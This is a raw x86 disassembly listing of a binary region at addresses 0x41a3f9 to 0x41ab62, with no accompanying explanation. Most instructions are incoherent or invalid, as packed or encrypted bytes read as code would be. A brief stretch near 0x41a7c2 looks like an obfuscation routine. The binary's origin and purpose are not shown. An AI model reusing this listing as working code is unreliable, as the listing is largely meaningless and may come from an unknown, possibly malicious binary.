  41a3f9:	sbb    DWORD PTR [ebp+0x1a],esp
  41a3fc:	ret    0xe407
  41a3ff:	xchg   esp,eax
  41a400:	(bad)  
  41a401:	dec    esp
  41a402:	lock sar ecx,cl
  41a405:	or     al,0x22
  41a407:	cwde   
  41a408:	mov    edx,ecx
  41a40a:	dec    edi
  41a40b:	mov    edx,0xa16fb874
  41a410:	js     0x41a3d0
  41a412:	test   al,0x52
  41a414:	adc    BYTE PTR [ebp-0x41],bl
  41a417:	sub    BYTE PTR [edx+0xe],cl
  41a41a:	shl    ebx,0x20
  41a41d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a41e:	cmp    edx,eax
  41a420:	lahf   
  41a421:	mov    DWORD PTR [edi-0x39],edx
  41a424:	imul   edx,DWORD PTR [ecx-0x1],0x9ff39457
  41a42b:	icebp  
  41a42c:	add    bl,0x87
  41a42f:	ins    BYTE PTR es:[edi],dx
  41a430:	and    cl,BYTE PTR [edi+0x2995654]
  41a436:	int3   
  41a437:	xor    DWORD PTR [ebp+0x39c17477],edi
  41a43d:	aas    
  41a43e:	add    ebx,edi
  41a440:	scas   al,BYTE PTR es:[edi]
  41a441:	out    0x71,al
  41a443:	cmp    al,0x2
  41a445:	inc    ebx
  41a446:	inc    esi
  41a447:	sub    eax,0xd3581d68
  41a44c:	adc    al,0x7b
  41a44e:	sub    al,0xb8
  41a450:	push   edx
  41a451:	push   ecx
  41a452:	out    0xf5,eax
  41a454:	es add al,0x58
  41a457:	pop    esp
  41a458:	jno    0x41a43f
  41a45a:	out    dx,al
  41a45b:	push   ss
  41a45c:	inc    esp
  41a45d:	in     al,0xa3
  41a45f:	stos   DWORD PTR es:[edi],eax
  41a460:	mov    bl,0xa5
  41a462:	pop    ecx
  41a463:	xor    bh,bh
  41a465:	jp     0x41a46d
  41a467:	push   edi
  41a468:	pop    ss
  41a469:	sub    al,0xb0
  41a46b:	pushf  
  41a46c:	push   es
  41a46d:	int    0xe7
  41a46f:	fwait
  41a470:	pop    esp
  41a471:	jg     0x41a4c8
  41a473:	pop    edi
  41a474:	push   edx
  41a475:	sbb    ecx,esi
  41a477:	mov    ecx,0x9dac65e8
  41a47c:	imul   ecx,edx,0xffffffd3
  41a47f:	xchg   BYTE PTR [ecx-0x3e],ch
  41a482:	ins    BYTE PTR es:[edi],dx
  41a483:	jecxz  0x41a49a
  41a485:	and    cl,BYTE PTR [eax-0x5b0956a9]
  41a48b:	int3   
  41a48c:	push   esi
  41a48d:	retf   
  41a48e:	mov    ah,0x3e
  41a490:	retf   
  41a491:	retf   
  41a492:	or     edx,DWORD PTR [ebx-0x6e]
  41a495:	dec    ebp
  41a496:	push   ebx
  41a497:	adc    bh,BYTE PTR [edx+0x36]
  41a49a:	sbb    eax,0xbef6d8fb
  41a49f:	rcl    DWORD PTR [esi+0x6ea06956],0xff
  41a4a6:	mov    bl,0xec
  41a4a8:	jl     0x41a4ea
  41a4aa:	inc    al
  41a4ac:	pop    es
  41a4ad:	dec    ebx
  41a4ae:	jne    0x41a523
  41a4b0:	inc    esi
  41a4b1:	pop    ebx
  41a4b2:	pop    edx
  41a4b3:	ja     0x41a4c2
  41a4b5:	push   edi
  41a4b6:	adc    esp,edi
  41a4b8:	imul   edi,DWORD PTR [ebp+0x56],0x40
  41a4bc:	stos   DWORD PTR es:[edi],eax
  41a4bd:	inc    edi
  41a4be:	jmp    0x41a4aa
  41a4c0:	mov    bh,0xde
  41a4c2:	ss sub eax,0x2a505eb
  41a4c8:	inc    eax
  41a4c9:	mov    dl,0x5a
  41a4cb:	adc    dh,ah
  41a4cd:	adc    BYTE PTR [edx-0x2b],dl
  41a4d0:	inc    ebp
  41a4d1:	mul    DWORD PTR [ebp+0xb]
  41a4d4:	xor    dl,ch
  41a4d6:	inc    BYTE PTR [edi+0x53]
  41a4d9:	icebp  
  41a4da:	test   BYTE PTR [edi],bl
  41a4dc:	push   ecx
  41a4dd:	jmp    0xc716:0xa358f1e
  41a4e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4e5:	push   ss
  41a4e6:	ficomp WORD PTR [ecx]
  41a4e8:	xor    BYTE PTR [ecx-0xf],0xea
  41a4ec:	jmp    0x5b2:0xe4b81e91
  41a4f3:	bound  edi,QWORD PTR [ecx-0x1c]
  41a4f6:	inc    esp
  41a4f7:	xchg   BYTE PTR [edi-0x4f2884e8],al
  41a4fd:	inc    eax
  41a4fe:	mov    bh,0xd2
  41a500:	inc    eax
  41a501:	push   ss
  41a502:	xchg   ebp,eax
  41a503:	addr16 cwde 
  41a505:	scas   al,BYTE PTR es:[edi]
  41a506:	hlt    
  41a507:	push   es
  41a508:	stos   DWORD PTR es:[edi],eax
  41a509:	adc    BYTE PTR [esi+0x3e827f08],0xcf
  41a510:	test   al,0x5c
  41a512:	pop    ebx
  41a513:	push   ebx
  41a514:	mov    eax,ecx
  41a516:	int    0x8f
  41a518:	div    cl
  41a51a:	pop    esi
  41a51b:	icebp  
  41a51c:	cmp    DWORD PTR [esi],ebx
  41a51e:	shl    DWORD PTR [ecx+0x43],0xe0
  41a522:	mov    dh,0xb1
  41a524:	popf   
  41a525:	mov    eax,0xf898cf3c
  41a52a:	sub    cl,BYTE PTR [ecx]
  41a52c:	push   edx
  41a52d:	push   edi
  41a52e:	xchg   edi,eax
  41a52f:	rcr    ebp,cl
  41a531:	add    cl,ch
  41a533:	inc    ecx
  41a534:	sub    BYTE PTR [ebp-0x47],bh
  41a537:	xchg   ebx,eax
  41a538:	call   0x1a25:0xeed23350
  41a53f:	aaa    
  41a540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a541:	add    al,0xf9
  41a543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a544:	xor    eax,0x55c224ba
  41a549:	sub    eax,0x628111d3
  41a54e:	mov    bh,0x5a
  41a550:	mov    bh,0x62
  41a552:	setno  BYTE PTR [ebp+0x3e0ee36d]
  41a559:	repnz cmc 
  41a55b:	fsubr  DWORD PTR ds:0x7627bae7
  41a561:	sub    edi,DWORD PTR [esp+ebp*1+0x73]
  41a565:	fcom   QWORD PTR [edi+esi*4-0x49ef1ab0]
  41a56c:	shr    DWORD PTR [edx],0xfb
  41a56f:	push   ss
  41a570:	xor    bh,BYTE PTR [eax+0x370ffaa]
  41a576:	retf   0x2e6
  41a579:	mov    esi,0xc51132ef
  41a57e:	aaa    
  41a57f:	stos   DWORD PTR es:[edi],eax
  41a580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a581:	jae    0x41a5db
  41a583:	je     0x41a529
  41a585:	sub    DWORD PTR [edx+0x10],esp
  41a588:	inc    edi
  41a589:	jno    0x41a5ce
  41a58b:	inc    edi
  41a58c:	add    eax,0xcdf4ed4e
  41a591:	push   edx
  41a592:	xor    ecx,DWORD PTR [ebx+0x4f]
  41a595:	pop    ebx
  41a596:	test   al,0x2f
  41a598:	loope  0x41a536
  41a59a:	pop    eax
  41a59b:	imul   esi,DWORD PTR [eax-0x11],0xa3e6f51d
  41a5a2:	sbb    al,0x2a
  41a5a4:	lahf   
  41a5a5:	mov    ah,0x98
  41a5a7:	mov    di,0x9f78
  41a5ab:	int    0x14
  41a5ad:	test   al,0x38
  41a5af:	pop    edi
  41a5b0:	add    dh,BYTE PTR [eax]
  41a5b2:	mov    ds:0xc2c696ae,eax
  41a5b7:	aad    0x0
  41a5b9:	out    0x12,eax
  41a5bb:	jmp    0x4cdeabf
  41a5c0:	in     al,dx
  41a5c1:	stc    
  41a5c2:	jbe    0x41a603
  41a5c4:	xchg   ecx,eax
  41a5c5:	out    dx,eax
  41a5c6:	lahf   
  41a5c7:	lahf   
  41a5c8:	mov    al,ds:0x2952ea4c
  41a5cd:	jp     0x41a627
  41a5cf:	xchg   ebp,eax
  41a5d0:	mov    bh,BYTE PTR [edi-0x2d]
  41a5d3:	bound  esp,QWORD PTR [ecx]
  41a5d5:	(bad)  [ebx]
  41a5d7:	mov    bh,0x3c
  41a5d9:	mov    bl,0xeb
  41a5db:	mov    ah,0xf2
  41a5dd:	sbb    esi,esp
  41a5df:	jecxz  0x41a5af
  41a5e1:	sub    al,0xa3
  41a5e3:	add    ebp,DWORD PTR [edi+0x31]
  41a5e6:	in     eax,0x49
  41a5e8:	sub    ebp,DWORD PTR [edx+ecx*1+0x6f]
  41a5ec:	popa   
  41a5ed:	inc    eax
  41a5ee:	mov    ds:0xe6bf9bf3,al
  41a5f3:	gs jmp 0x41a662
  41a5f6:	leave  
  41a5f7:	fnstenv [edx+eax*2]
  41a5fa:	xchg   DWORD PTR [ecx+edi*4],ebx
  41a5fd:	js     0x41a5a6
  41a5ff:	add    bl,dh
  41a601:	addr16 add eax,0xa91dcf2a
  41a607:	cwde   
  41a608:	outs   dx,DWORD PTR ds:[esi]
  41a609:	and    al,0xbf
  41a60b:	push   cs
  41a60c:	pop    ss
  41a60d:	jno    0x41a689
  41a60f:	jecxz  0x41a622
  41a611:	adc    al,ah
  41a613:	imul   edi,DWORD PTR [ebp+0x14],0xffffffe1
  41a617:	(bad)  
  41a618:	bound  esp,QWORD PTR [edi+0xb]
  41a61b:	(bad)  
  41a61c:	rol    esi,cl
  41a61e:	jne    0x41a5d8
  41a620:	mov    al,0x4e
  41a622:	add    al,0x23
  41a624:	cmp    eax,0x2bf2d8ea
  41a629:	into   
  41a62a:	fistp  WORD PTR [ebp+0x4f]
  41a62d:	pushf  
  41a62e:	sbb    BYTE PTR [edi-0x5c],bh
  41a631:	mov    ebp,0x8cf312fe
  41a636:	jl     0x41a626
  41a638:	mov    ch,0x24
  41a63a:	push   cs
  41a63b:	es iret 
  41a63d:	dec    ebp
  41a63e:	sub    BYTE PTR [ebp+edx*2+0x21e21b57],ah
  41a645:	popa   
  41a646:	cs push edi
  41a648:	mov    ecx,0xd1223c25
  41a64d:	push   ebp
  41a64e:	fs jae 0x41a61f
  41a651:	sbb    dh,BYTE PTR [ebp+0x2a]
  41a654:	xchg   esp,eax
  41a655:	pop    ebx
  41a656:	test   BYTE PTR [esi-0x99869c3],0x9
  41a65d:	sbb    esp,DWORD PTR [edx+ebp*1+0x2a]
  41a661:	or     ebp,DWORD PTR [edx+0xfaded82]
  41a667:	mov    ebx,0x549f9065
  41a66c:	cs mov ecx,0x6da1a728
  41a672:	adc    esp,eax
  41a674:	imul   ebx,DWORD PTR [esi],0xffffffae
  41a677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a678:	xor    al,BYTE PTR [ebx+0x5f]
  41a67b:	mov    BYTE PTR [ebp-0x23],cl
  41a67e:	xor    DWORD PTR [ecx-0x60],esp
  41a681:	pop    edx
  41a682:	jg     0x41a6e6
  41a684:	and    BYTE PTR [edi],ah
  41a686:	add    bl,BYTE PTR [ecx-0x5385ae0c]
  41a68c:	cmp    BYTE PTR [ebp+0x276c7e18],al
  41a692:	xchg   edi,eax
  41a693:	out    dx,al
  41a694:	cmp    DWORD PTR [ecx+0x75],edx
  41a697:	xor    dh,dl
  41a699:	sub    al,0xf9
  41a69b:	add    eax,edi
  41a69d:	jne    0x41a676
  41a69f:	xchg   DWORD PTR [edx-0x30],ebp
  41a6a2:	sbb    eax,0x67fe6a7e
  41a6a7:	in     eax,0xdc
  41a6a9:	ror    DWORD PTR [eax+0x63],0x70
  41a6ad:	mov    eax,ds:0x3df042ad
  41a6b2:	dec    ebx
  41a6b3:	fimul  DWORD PTR [edx+ecx*1]
  41a6b6:	fnstcw WORD PTR [ebx-0x70]
  41a6b9:	out    0x2a,al
  41a6bb:	push   esp
  41a6bc:	aam    0xc7
  41a6be:	sub    eax,0xcc29abf8
  41a6c3:	adc    BYTE PTR [esi+edi*2],dl
  41a6c6:	jle    0x41a686
  41a6c8:	sub    ah,BYTE PTR [ecx]
  41a6ca:	mov    edx,0x10fc5ae8
  41a6cf:	mov    esp,0x6cb20b93
  41a6d4:	or     bh,0x6e
  41a6d7:	jae    0x41a67c
  41a6d9:	push   edi
  41a6da:	or     bl,BYTE PTR [edx+eiz*4]
  41a6dd:	dec    ebx
  41a6de:	or     DWORD PTR [ebx],edx
  41a6e0:	shl    BYTE PTR ds:0xe67163da,0x5e
  41a6e7:	(bad)  
  41a6e8:	sub    BYTE PTR [ecx-0x69532df9],dh
  41a6ee:	fcmovne st,st(1)
  41a6f0:	stc    
  41a6f1:	mov    cs,WORD PTR [ecx+0x12]
  41a6f4:	ja     0x41a6ab
  41a6f6:	js     0x41a696
  41a6f8:	jmp    0x2a062577
  41a6fd:	sub    eax,0x6f24e3ef
  41a702:	cmc    
  41a703:	sub    ebx,edx
  41a705:	scas   al,BYTE PTR es:[edi]
  41a706:	mov    ds:0x334eaacd,al
  41a70b:	loopne 0x41a6d1
  41a70d:	mov    ebp,esp
  41a70f:	jmp    0x5afe:0xc481be4b
  41a716:	das    
  41a717:	js     0x41a72b
  41a719:	aas    
  41a71a:	dec    ebp
  41a71b:	add    ebp,DWORD PTR [edi+0x2a801f5a]
  41a721:	push   ss
  41a722:	les    ecx,FWORD PTR [edx+0xa]
  41a725:	jp     0x41a754
  41a727:	sar    BYTE PTR ds:0x76a5eae2,0x7a
  41a72e:	sbb    DWORD PTR [eax],eax
  41a730:	xor    eax,0x49d2555a
  41a735:	inc    esi
  41a736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a737:	lods   al,BYTE PTR ds:[esi]
  41a738:	das    
  41a739:	add    al,0xe3
  41a73b:	enter  0x42ec,0x6f
  41a73f:	push   sp
  41a741:	pop    eax
  41a742:	jne    0x41a784
  41a744:	ret    0xd47d
  41a747:	xchg   edi,eax
  41a748:	int    0x3e
  41a74a:	imul   bp,WORD PTR [edx-0x3a],0xff9d
  41a74f:	stos   BYTE PTR es:[edi],al
  41a750:	lock or DWORD PTR [ebx-0x3e],edi
  41a754:	jp     0x41a722
  41a756:	sub    eax,0x6d334674
  41a75b:	cmp    eax,0x58ee89b2
  41a760:	aas    
  41a761:	in     eax,dx
  41a762:	xor    BYTE PTR [edi-0x30],ch
  41a765:	mov    BYTE PTR [eax-0x64d1eb1b],ch
  41a76b:	(bad)  
  41a76c:	dec    ebx
  41a76d:	jo     0x41a740
  41a76f:	sub    al,dl
  41a771:	push   ss
  41a772:	mov    edi,0x48bd798
  41a777:	int3   
  41a778:	push   ss
  41a779:	inc    ebx
  41a77a:	dec    ecx
  41a77b:	jns    0x41a760
  41a77d:	repnz (bad) 
  41a77f:	xlat   BYTE PTR ds:[ebx]
  41a780:	shl    esi,0x3e
  41a783:	push   edi
  41a784:	hlt    
  41a785:	add    bl,bh
  41a787:	adc    BYTE PTR [ebx],ch
  41a789:	in     eax,dx
  41a78a:	cmp    al,0xc2
  41a78c:	shr    cl,0x96
  41a78f:	lahf   
  41a790:	mov    esi,0x1ab061ed
  41a795:	out    0xce,eax
  41a797:	jb     0x41a7cf
  41a799:	jnp    0x41a7cb
  41a79b:	cmp    eax,0xb336cd2e
  41a7a0:	and    DWORD PTR [eax-0x89c2fb7],edx
  41a7a6:	xor    BYTE PTR [eax],0x4b
  41a7a9:	xor    ebx,DWORD PTR [ebx]
  41a7ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7ac:	adc    edi,DWORD PTR [ebx]
  41a7ae:	fidiv  DWORD PTR [eax+0x4a]
  41a7b1:	mov    ds:0x4b19548,eax
  41a7b6:	fs push 0x34c4f309
  41a7bc:	ret    
  41a7bd:	popf   
  41a7be:	cmp    eax,ebp
  41a7c0:	jg     0x41a80f
  41a7c2:	and    eax,0x89ec558b
  41a7c7:	push   ebp
  41a7c8:	or     cl,ch
  41a7ca:	mov    ecx,0x8b000023
  41a7cf:	push   ebp
  41a7d0:	or     BYTE PTR [ebx-0x2fcc07a3],cl
  41a7d6:	xor    ebx,eax
  41a7d8:	sub    edx,ebx
  41a7da:	sub    edx,esi
  41a7dc:	xor    edx,eax
  41a7de:	mov    DWORD PTR [ebp+0x8],edx
  41a7e1:	mov    edx,DWORD PTR [ebp+0x8]
  41a7e4:	mov    ebx,DWORD PTR [ebp-0x58]
  41a7e7:	add    edx,0x5708c4
  41a7ed:	imul   edx,ebx
  41a7f0:	mov    DWORD PTR [ebp-0x58],edx
  41a7f3:	mov    edx,DWORD PTR [ebp+0x8]
  41a7f6:	mov    ebx,DWORD PTR [ebp-0x54]
  41a7f9:	add    edx,0x64f8da
  41a7ff:	or     edx,ebx
  41a801:	mov    DWORD PTR [ebp-0x54],edx
  41a804:	mov    edx,DWORD PTR [ebp+0x8]
  41a807:	mov    ebx,DWORD PTR [ebp-0x50]
  41a80a:	add    edx,ecx
  41a80c:	xor    edx,ebx
  41a80e:	mov    DWORD PTR [ebp-0x50],edx
  41a811:	mov    edx,DWORD PTR [ebp+0x8]
  41a814:	mov    ebx,DWORD PTR [ebp-0x4c]
  41a817:	add    edx,edi
  41a819:	jmp    0x41cb62
  41a81e:	retf   
  41a81f:	lock xacquire sub DWORD PTR [ebx+0x2b],esi
  41a824:	mov    bl,0x72
  41a826:	cmp    bl,BYTE PTR [ebp+ebx*2+0x433a052e]
  41a82d:	mov    bl,0x90
  41a82f:	adc    edi,DWORD PTR [ebp+0x7c]
  41a832:	inc    eax
  41a833:	pop    edi
  41a834:	jl     0x41a8b2
  41a836:	mov    edi,0x37ed6b2b
  41a83b:	leave  
  41a83c:	in     eax,0xf6
  41a83e:	int    0x45
  41a840:	aad    0xd3
  41a842:	jp     0x41a830
  41a844:	pop    es
  41a845:	icebp  
  41a846:	imul   eax,DWORD PTR [ecx],0xdca31c8c
  41a84c:	sbb    DWORD PTR [esi+0x352afa65],ebp
  41a852:	sub    DWORD PTR [esi],0xffffff82
  41a855:	push   esi
  41a856:	mov    ds:0x2fd6ba4f,eax
  41a85b:	lods   al,BYTE PTR ds:[esi]
  41a85c:	iret   
  41a85d:	sub    al,0x3a
  41a85f:	inc    ecx
  41a860:	(bad)  
  41a861:	(bad)  
  41a863:	lock pop ecx
  41a865:	(bad)  
  41a867:	or     al,0xf8
  41a869:	and    DWORD PTR [ecx+0x10683560],eax
  41a86f:	into   
  41a870:	es jg  0x41a871
  41a873:	test   al,0xd6
  41a875:	inc    ebx
  41a876:	cli    
  41a877:	fld    TBYTE PTR [ebp+edx*1-0x5e15ebca]
  41a87e:	and    ch,bl
  41a880:	sbb    esp,DWORD PTR [esi+0x6c]
  41a883:	adc    DWORD PTR [ebx+0x4dff1802],ebx
  41a889:	dec    esi
  41a88a:	mov    ds:0x6a9fee7c,eax
  41a88f:	(bad)  
  41a891:	aaa    
  41a892:	jo     0x41a889
  41a894:	xadd   DWORD PTR ds:0xa3a951c5,esi
  41a89b:	mov    eax,0x61c47420
  41a8a0:	mov    bh,0x13
  41a8a2:	call   0x2354:0x8561b18e
  41a8a9:	cmp    edi,DWORD PTR [ebx]
  41a8ab:	xchg   edi,eax
  41a8ac:	mov    bh,0x3
  41a8ae:	mov    al,0xcd
  41a8b0:	xchg   edx,eax
  41a8b1:	test   al,0x14
  41a8b3:	xchg   edi,eax
  41a8b4:	ss dec ebx
  41a8b6:	and    bl,BYTE PTR [edi-0x492d3bdf]
  41a8bc:	ins    BYTE PTR es:[edi],dx
  41a8bd:	or     BYTE PTR [edi+0x38c0a185],cl
  41a8c3:	fst    DWORD PTR [ecx-0x70]
  41a8c6:	jmp    0x41a8e0
  41a8c8:	xchg   BYTE PTR [ebx+0x5c294bed],dh
  41a8ce:	(bad)  
  41a8cf:	mov    edi,0x764716b3
  41a8d4:	dec    edi
  41a8d5:	int3   
  41a8d6:	mov    WORD PTR [ecx+0x668b555f],gs
  41a8dc:	sub    edi,0xffffffaa
  41a8df:	jecxz  0x41a87f
  41a8e1:	or     DWORD PTR [edx-0x7a1144f1],eax
  41a8e7:	test   DWORD PTR [edx-0x1b3e592],ebp
  41a8ed:	add    dl,BYTE PTR ds:0x69e0172f
  41a8f3:	ret    0x2064
  41a8f6:	xor    BYTE PTR [esi-0x11],dl
  41a8f9:	or     edi,DWORD PTR [ebx-0x3086f96a]
  41a8ff:	loop   0x41a905
  41a901:	adc    esp,DWORD PTR [ecx]
  41a903:	dec    ebx
  41a904:	rol    BYTE PTR [ecx+0x34],0x59
  41a908:	loopne 0x41a8f7
  41a90a:	sbb    eax,0x442379d7
  41a90f:	jmp    0x41a948
  41a911:	pop    edx
  41a912:	and    DWORD PTR [edi+0x13cd684c],edi
  41a918:	push   ds
  41a919:	pop    ebx
  41a91a:	imul   esp,DWORD PTR [ebx+0x79759a06],0xd0728390
  41a924:	(bad)  
  41a926:	in     eax,0xe4
  41a928:	dec    edx
  41a929:	mov    al,0x19
  41a92b:	out    dx,eax
  41a92c:	call   0x926d2f1d
  41a931:	xchg   ecx,eax
  41a932:	add    edi,ebp
  41a934:	jae    0x41a8d0
  41a936:	mov    cl,0x75
  41a938:	and    eax,DWORD PTR [ecx+edi*8]
  41a93b:	or     cl,BYTE PTR [edi-0x78]
  41a93e:	jg     0x41a96f
  41a940:	mov    es,WORD PTR [eax+ebp*1+0x27]
  41a944:	das    
  41a945:	mov    edi,0x129101e1
  41a94a:	push   esi
  41a94b:	push   esi
  41a94c:	sub    DWORD PTR [ebx],eax
  41a94e:	les    edx,FWORD PTR ds:0x7b3cce82
  41a954:	mov    ch,0xef
  41a956:	lahf   
  41a957:	(bad)  
  41a958:	jno    0x41a8e0
  41a95a:	push   0xc28f8d49
  41a95f:	jge    0x41a965
  41a961:	jecxz  0x41a8e3
  41a963:	pop    ebx
  41a964:	sbb    DWORD PTR [eax],ebp
  41a966:	int    0x4f
  41a968:	les    eax,FWORD PTR [edi]
  41a96a:	cmp    al,0xd7
  41a96c:	or     al,cl
  41a96e:	ins    BYTE PTR es:[edi],dx
  41a96f:	fwait
  41a970:	and    BYTE PTR [edx+0x2d849cdb],cl
  41a976:	add    eax,esi
  41a978:	inc    edi
  41a979:	cwde   
  41a97a:	jl     0x41a9c0
  41a97c:	int3   
  41a97d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a97e:	pop    edi
  41a97f:	out    0xcb,eax
  41a981:	out    dx,eax
  41a982:	(bad)  
  41a983:	out    0x0,eax
  41a985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a986:	loopne 0x41a9d3
  41a988:	(bad)  
  41a989:	retf   
  41a98a:	aas    
  41a98b:	cmp    DWORD PTR [edx+0xf],esi
  41a98e:	inc    edx
  41a98f:	dec    ebx
  41a990:	push   0x7d
  41a992:	cmp    al,0x99
  41a994:	jns    0x41a9fa
  41a996:	aas    
  41a997:	retf   
  41a998:	pop    es
  41a999:	jge    0x41a94a
  41a99b:	add    BYTE PTR [esi+ecx*8+0x41],0x6f
  41a9a0:	int    0x6b
  41a9a2:	sbb    bl,dl
  41a9a4:	data16 repnz (bad) 
  41a9a7:	out    0xda,eax
  41a9a9:	push   DWORD PTR [esi+0x7c]
  41a9ac:	data16 sbb BYTE PTR [ebx+0x71],bl
  41a9b0:	test   al,0x11
  41a9b2:	mov    ds:0x618b696f,al
  41a9b7:	dec    edi
  41a9b8:	repnz mov ch,0x7a
  41a9bb:	jne    0x41a9bb
  41a9bd:	lods   eax,DWORD PTR ds:[esi]
  41a9be:	or     BYTE PTR [edi+ebp*4-0x71d33749],bh
  41a9c5:	cmc    
  41a9c6:	cmp    DWORD PTR [esi+0x67c977cb],eax
  41a9cc:	add    BYTE PTR [ecx],ch
  41a9ce:	inc    edi
  41a9cf:	pusha  
  41a9d0:	mov    eax,ds:0x91748c01
  41a9d5:	pop    esi
  41a9d6:	scas   eax,DWORD PTR es:[edi]
  41a9d7:	sar    DWORD PTR [ecx],0x28
  41a9da:	test   edi,ebx
  41a9dc:	push   eax
  41a9dd:	dec    ebp
  41a9de:	retf   0x67b2
  41a9e1:	xor    al,0x36
  41a9e3:	mov    ds:0x80f3da2c,eax
  41a9e8:	mul    ah
  41a9ea:	out    0x35,eax
  41a9ec:	dec    ecx
  41a9ed:	(bad)  
  41a9ee:	arpl   WORD PTR [ebx+0x1d8feda7],dx
  41a9f4:	enter  0xb79e,0xeb
  41a9f8:	dec    ebp
  41a9f9:	imul   edi,DWORD PTR [ecx+0x40],0xc2e74366
  41aa00:	jbe    0x41aa3c
  41aa02:	jmp    0xb6383458
  41aa07:	mov    ah,0xa0
  41aa09:	lods   eax,DWORD PTR ds:[esi]
  41aa0a:	push   edx
  41aa0b:	adc    ebx,ecx
  41aa0d:	fist   WORD PTR [ecx-0x55]
  41aa10:	cmp    esi,0x4977c3d0
  41aa16:	ret    0x45be
  41aa19:	sbb    al,0xe1
  41aa1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa1c:	call   0xc9c78fc3
  41aa21:	aas    
  41aa22:	pop    esi
  41aa23:	mov    ecx,0x226f4b0e
  41aa28:	hlt    
  41aa29:	sub    bh,bl
  41aa2b:	cmp    eax,0x68214439
  41aa30:	ins    BYTE PTR es:[edi],dx
  41aa31:	pop    esi
  41aa32:	push   esi
  41aa33:	imul   ebp,eax,0x6c
  41aa36:	sbb    BYTE PTR [esi],cl
  41aa38:	(bad)  
  41aa39:	cld    
  41aa3a:	inc    eax
  41aa3b:	mov    edi,0xbef6d200
  41aa40:	inc    ebx
  41aa41:	popf   
  41aa42:	fld    QWORD PTR [esi-0x2c]
  41aa45:	cmp    DWORD PTR [ebx],0xf664ee92
  41aa4b:	sub    eax,0xc5a9f64a
  41aa50:	fsub   DWORD PTR ds:0xd132cfa6
  41aa56:	in     al,dx
  41aa57:	pop    es
  41aa58:	push   es
  41aa59:	sub    BYTE PTR [ebp+0x5a],0xf3
  41aa5d:	scas   eax,DWORD PTR es:[edi]
  41aa5e:	test   al,0x21
  41aa60:	and    edi,DWORD PTR [edx]
  41aa62:	jle    0x41a9f5
  41aa64:	sub    eax,0xc3118f65
  41aa69:	mov    bl,0xfc
  41aa6b:	popa   
  41aa6c:	data16 sbb BYTE PTR [edi-0x72b5f6f6],bl
  41aa73:	dec    ebp
  41aa74:	push   ebx
  41aa75:	pusha  
  41aa76:	push   eax
  41aa77:	jg     0x41aaaf
  41aa79:	lods   al,BYTE PTR ds:[esi]
  41aa7a:	cld    
  41aa7b:	scas   eax,DWORD PTR es:[edi]
  41aa7c:	cmp    DWORD PTR [esi],0xfffffff6
  41aa7f:	xchg   edi,eax
  41aa80:	out    dx,al
  41aa81:	jecxz  0x41aa8a
  41aa83:	cmp    dl,BYTE PTR [eax]
  41aa85:	fdiv   DWORD PTR [esi+eiz*1]
  41aa88:	rcr    eax,1
  41aa8a:	or     DWORD PTR cs:[ebx-0x46cbe42d],esi
  41aa91:	hlt    
  41aa92:	mov    bl,0x1a
  41aa94:	jne    0x41aa7b
  41aa96:	fimul  DWORD PTR [eax-0x50]
  41aa99:	mov    dl,0x78
  41aa9b:	adc    al,BYTE PTR [ecx+0xe]
  41aa9e:	push   esi
  41aa9f:	sub    eax,0x8c560c3a
  41aaa4:	push   0x5
  41aaa6:	dec    edi
  41aaa7:	cwde   
  41aaa8:	or     dl,BYTE PTR [edi+0x6c07a063]
  41aaae:	jnp    0x41aa3e
  41aab0:	fwait
  41aab1:	inc    edi
  41aab2:	mov    eax,0x70c24d94
  41aab7:	jmp    0xd184:0xe926ee1b
  41aabe:	sbb    eax,0xb22787e5
  41aac3:	(bad)  
  41aac5:	mov    ch,0x2a
  41aac7:	popa   
  41aac8:	jno    0x41aae1
  41aaca:	jnp    0x41aa85
  41aacc:	mov    dh,ch
  41aace:	and    al,0x94
  41aad0:	xor    eax,0x93f5df3
  41aad5:	call   0xcb44:0x5b477036
  41aadc:	outs   dx,BYTE PTR ds:[esi]
  41aadd:	mov    ds:0x233b2c18,eax
  41aae2:	xchg   edi,eax
  41aae3:	adc    dh,BYTE PTR [edx+0x6fb5591]
  41aae9:	test   al,0x6c
  41aaeb:	push   eax
  41aaec:	fscale 
  41aaee:	jne    0x41aac8
  41aaf0:	jns    0x41aa9e
  41aaf2:	std    
  41aaf3:	mov    cl,0x2d
  41aaf5:	xchg   DWORD PTR [edi+0x7458a53e],ecx
  41aafb:	adc    eax,esi
  41aafd:	push   eax
  41aafe:	sub    eax,0x8779e344
  41ab03:	adc    eax,0xc082bf56
  41ab08:	sub    ch,BYTE PTR [eax+edi*1+0x16]
  41ab0c:	in     eax,dx
  41ab0d:	adc    DWORD PTR [esi],esp
  41ab0f:	cmp    DWORD PTR [esi-0x107bca7d],edx
  41ab15:	xor    edi,eax
  41ab17:	in     al,0x68
  41ab19:	mov    DWORD PTR [ecx],edx
  41ab1b:	xchg   DWORD PTR [eax-0x36],esi
  41ab1e:	inc    ebx
  41ab1f:	aas    
  41ab20:	adc    BYTE PTR ss:[ecx-0x6d],0x9e
  41ab25:	pusha  
  41ab26:	lea    ebp,[ebp-0x66]
  41ab29:	adc    BYTE PTR [ebp+0x7879594f],ch
  41ab2f:	shr    DWORD PTR ds:0xe18f0bb7,1
  41ab35:	dec    eax
  41ab36:	dec    esp
  41ab37:	cld    
  41ab38:	cmp    al,0x21
  41ab3a:	fs mov dh,0x74
  41ab3d:	ret    
  41ab3e:	shr    DWORD PTR ds:0x4054f17a,1
  41ab44:	adc    BYTE PTR [eax],bl
  41ab46:	int    0x23
  41ab48:	arpl   WORD PTR [edi+0x27ae1928],bx
  41ab4e:	sbb    eax,0x28e16353
  41ab53:	(bad)  
  41ab54:	stc    
  41ab55:	cwde   
  41ab56:	push   ss
  41ab57:	lods   eax,DWORD PTR ds:[esi]
  41ab58:	or     cl,0xaf
  41ab5b:	inc    ebp
  41ab5c:	inc    ebp
  41ab5d:	nop
  41ab5e:	jb     0x41abc9
  41ab60:	adc    BYTE PTR [esi],cl
  41ab62:	jge    0x41ab83
